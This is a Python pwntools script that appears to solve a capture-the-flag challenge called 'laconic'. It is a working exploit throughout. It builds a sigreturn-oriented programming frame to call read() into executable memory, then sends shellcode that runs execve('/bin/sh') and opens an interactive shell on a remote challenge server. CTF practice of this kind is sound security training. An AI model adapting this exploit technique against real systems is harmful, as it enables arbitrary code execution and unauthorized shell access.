#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./laconic")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.64.253", 50373)

    return r


# This works on remote and while debugging (probably in local the program is too fast to receive the second payload)
def main():
    r = conn()
    
    _start  = 0x43000
    pop_rax = 0x43018

    frame = SigreturnFrame(kernel = 'amd64')
    frame.rax = 0x0             # read
    frame.rdi = 0x0             # stdin
    frame.rsi = _start          # target address (after `syscall` instruction)
    frame.rdx = 0x100           # count
    frame.rsp = 0x43800         # something to act as stack
    frame.rip = _start + 21     # syscall

    payload = flat(
            b"A" * 8,
            pop_rax,            # rt_sigreturn
            0x0f,
            _start + 21,        # syscall; ret;
            frame
        )
    
    r.sendline(payload)

    payload = asm("""
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    nop
                    mov rdi, 0x68732f6e69622f
                    push rdi
                    mov rdi, rsp
                    xor esi, esi
                    xor edx, edx
                    mov al, 0x3b
                    syscall
                """)

    r.send(payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
